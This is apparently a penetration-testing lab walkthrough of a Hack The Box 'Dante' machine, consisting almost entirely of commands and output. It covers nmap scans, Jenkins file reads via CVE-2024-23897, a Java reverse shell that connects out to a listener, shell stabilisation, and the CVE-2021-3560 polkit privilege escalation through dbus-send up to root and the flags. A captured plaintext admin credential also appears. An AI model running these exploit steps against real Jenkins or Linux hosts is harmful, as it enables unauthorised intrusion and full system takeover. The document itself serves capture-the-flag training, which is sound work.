# 172.16.1.19 - DANTE-NIX07 Pwn3d!

nmap -sC -sV 172.16.1.19

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-03 10:59 CDT

Nmap scan report for 172.16.1.19

Host is up (0.013s latency).

Not shown: 998 closed tcp ports (reset)

PORT STATE SERVICE VERSION

80/tcp open http Apache httpd 2.4.41

|_http-server-header: Apache/2.4.41 (Ubuntu)

|_http-title: Index of /

8080/tcp open http Jetty 9.4.27.v20200227

| http-robots.txt: 1 disallowed entry

|_/

|_http-server-header: Jetty(9.4.27.v20200227)

|_http-title: Site doesn’t have a title (text/html;charset=utf-8).

Service Info: Host: 127.0.0.1

sudo nmap -p- 172.16.1.19
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-07-02 14:05 EDT
Nmap scan report for 172.16.1.19
Host is up (0.013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
8888/tcp  open  sun-answerbook
33060/tcp open  mysqlx

CVE-2019-17638

curl -sI [http://172.16.1.19:8080/](http://172.16.1.19:8080/) | grep -i x-jenkins
X-Jenkins: 2.240
X-Jenkins-Session: e721dfdb

**CVE-2024–23897**

java -jar jenkins-cli.jar -s [http://172.16.1.19:8080/](http://172.16.1.19:8080/) -http who-am-i @/proc/self/environ

ERROR: No argument is allowed: SHELL=/bin/bashPWD=/var/lib/jenkinsLOGNAME=jenkinsXDG_SESSION_TYPE=unspecifiedHOME=/var/lib/jenkinsLANG=en_US.UTF-8XDG_SESSION_CLASS=backgroundUSER=jenkinsSHLVL=0XDG_SESSION_ID=c1XDG_RUNTIME_DIR=/run/user/126XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktopPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/126/busMAIL=/var/mail/jenkins_=/usr/bin/daemonJENKINS_HOME=/var/lib/jenkinsSHELL=/bin/bashPWD=/var/lib/jenkinsLOGNAME=jenkinsXDG_SESSION_TYPE=unspecifiedHOME=/var/lib/jenkinsLANG=en_US.UTF-8XDG_SESSION_CLASS=backgroundUSER=jenkinsSHLVL=0XDG_SESSION_ID=c1XDG_RUNTIME_DIR=/run/user/126XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktopPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/126/busMAIL=/var/mail/jenkins_=/usr/bin/daemonJENKINS_HOME=/var/lib/jenkins
java -jar jenkins-cli.jar who-am-i
Reports your credential and permissions.

![image.png](172%2016%201%2019%20-%20DANTE-NIX07%20Pwn3d%21/image.png)

cat Jenkins.bat
net user Admin_129834765 SamsungOctober102030 /add

![image.png](172%2016%201%2019%20-%20DANTE-NIX07%20Pwn3d%21/image%201.png)

DANTE{to_g0_4ward_y0u_mus7_g0_back}

String host="172.16.1.100";
int port=4443;
String[] cmd=["/bin/bash","-i"];
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
Thread.sleep(50);
try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();

nc -lvnp 4443
Listening on 0.0.0.0 4443
Connection received on 127.0.0.1 43556
bash: cannot set terminal process group (1273): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@DANTE-NIX07:/$python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
jenkins@DANTE-NIX07:/$ ^Z
[1]+  Stopped                 nc -lvnp 4443
┌─[us-dante-2]─[10.10.14.83]─[ronking37@htb-mr4zif738x]─[~]
└──╼ [★]$ stty raw -echo; fg
nc -lvnp 4443

jenkins@DANTE-NIX07:/$export TERM=xterm
jenkins@DANTE-NIX07:/$ ls
bin   cdrom  etc   lib	  lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
jenkins@DANTE-NIX07:/$id
uid=126(jenkins) gid=133(jenkins) groups=133(jenkins)
jenkins@DANTE-NIX07:/$ hostname
DANTE-NIX07
jenkins@DANTE-NIX07:/$

jenkins@DANTE-NIX07:/dev/shm$ python3 [CVE-2021-3560.py](http://cve-2021-3560.py/)

##############CVE-2021-3560##############

# __________ .__ __ .__ __

# \______ \____ | | | | *|__|/ |*

# | ___/ _ \| | | |/ / \ __\

# | | ( <*> ) |*| <| || |

# |**| \**/|___*/__|* \**||**|

# \/

# Local Privilege Escalation Exploit

# Author: Salman Asad (@deathflash1411)

#########################################

Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] User created!
[+] Username: flash
[+] User ID: 1002
[!] Run the below command a few times (<10) and login via su - flash

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$HPVUSULZZ8BMl4wE$zisRakxfq9IDf7mY0FUteDiKtYYRjmGkf3RAUjFE2P2' string:GoldenEye & sleep 0.005s ; kill $!

jenkins@DANTE-NIX07:/dev/shm$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$tlYFZkD1.2D3uDwo$f8TvONHeO90HlJ1HwxUyU52jEAyeOKP6u60j1FA3cE2' string:GoldenEye & sleep 0.005s ; kill $! 

10x 

jenkins@DANTE-NIX07:/dev/shm$ su - flash
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

flash@DANTE-NIX07:~$ sudo su
[sudo] password for flash:
root@DANTE-NIX07:/home/flash# id
uid=0(root) gid=0(root) groups=0(root)
root@DANTE-NIX07:/home/flash# cd /root
root@DANTE-NIX07:~# ls
flag.txt  snap
root@DANTE-NIX07:~# cat flag.txt
DANTE{g0tta_<3_ins3cur3_GROupz!}